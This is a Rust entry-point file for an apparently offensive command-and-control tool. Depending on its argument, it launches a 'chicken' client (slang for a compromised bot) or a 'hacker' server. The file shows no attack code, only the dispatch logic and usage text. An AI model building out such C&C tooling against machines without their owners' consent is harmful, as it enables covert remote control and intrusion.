use crate::common::log::Log;
use crate::{chicken, hacker, init};
use std::env;


const TIPS: &str = "\
Usage: ./tester chicken ...args : Run C&C Client
Usage: ./tester hacker ...args : Run C&C Server \
";
pub async fn run_application() {
    init::__async_init().await;
    let side = match env::args().skip(1).next() {
        None => Log::panic(TIPS),
        Some(e) => e,
    };
    match side.as_str() {
        "chicken" => chicken::application::app().await,
        "hacker" => hacker::application::app().await,
        _ => Log::panic(TIPS),
    };
}
